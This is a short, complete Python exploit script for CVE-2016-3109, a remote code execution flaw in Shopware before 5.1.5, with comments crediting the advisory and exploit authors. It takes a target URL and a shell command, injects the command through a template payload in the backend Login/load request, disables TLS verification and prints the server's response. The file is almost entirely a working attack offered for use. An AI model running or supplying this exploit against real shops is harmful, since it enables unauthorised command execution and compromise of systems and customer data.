#!/usr/bin/env python3
# coding=utf-8
# **************************************************************************************
# CREDITS
# This issue has been identified by David Vieira-Kurz of Immobilien Scout GmbH.
# Link: https://packetstormsecurity.com/files/136781/Shopware-Remote-Code-Execution.html
#
# Exploit was written by Jens Regel
# Link: https://github.com/jensregel/Advisories/tree/master/CVE-2016-3109
#
# **************************************************************************************
import sys
import requests
import argparse

try:
     import requests.packages.urllib3
     requests.packages.urllib3.disable_warnings()
except:
     pass

if len(sys.argv) <= 1:
    print('[*] Shopware < 5.1.5 Remote Code Execution (CVE-2016-3109)')
    print('[*] Advisory - David Vieira-Kurz')
    print('[*] Exploit - Jens Regel')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", dest="url", help="URL to exploit", action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

req = ""+ url +"/backend/Login/load/?f=m%2fLocale%7cv%2fMain%7cv%2fmain%2fForm%7cstore%2fLocale%7cc%2fMain%7b$%7bsystem('"+ cmd +"')%7d%7d"
response = requests.get(req, verify=False)

print (response.content)
